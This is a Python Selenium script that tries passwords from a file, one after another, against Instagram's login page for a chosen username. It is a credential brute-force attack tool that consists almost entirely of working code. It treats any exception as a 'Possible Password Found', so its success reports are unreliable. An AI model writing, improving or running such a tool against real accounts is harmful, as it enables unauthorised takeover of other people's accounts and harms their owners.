#!/usr/bin/python3

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import time, random

# color
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   CWHITE  = '\33[37m'

# Username of your instagram account:
print()
my_username = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter Your Username: ')

# Code to select Password from pass.txt
f = open("pass.txt", "r")

#headless browser

options = Options()
options.headless = False

options.add_experimental_option("detach", True)

browser = webdriver.Chrome()

# Authorization:
def auth(username):
	try:

# use loop (completing code on line 25)
	    for password in f:
		    browser.get('https://www.instagram.com/accounts/login/?force_classic_login')
		    time.sleep(1)

		    input_username = browser.find_element_by_xpath('//*[@id="id_username"]')
		    input_password = browser.find_element_by_xpath('//*[@id="id_enc_password"]')

		    input_username.send_keys(username)
		    input_password.send_keys(password)
		    
		    time.sleep(1)
		    input_password.send_keys(Keys.ENTER)

# Waiting for 5 seconds after login so site won't reload but display an error message
		    time.sleep(5)
		    print()

# Print the current user and pass in use
		    print (color.GREEN + 'Tried password: '+color.RED + password + color.GREEN + 'for user: '+color.RED+ username)

# Using error message for printing password found
	except Exception as err:
		print()
		print (color.GREEN + 'Possible Password Found [!] ')
		browser.quit()

auth(my_username)
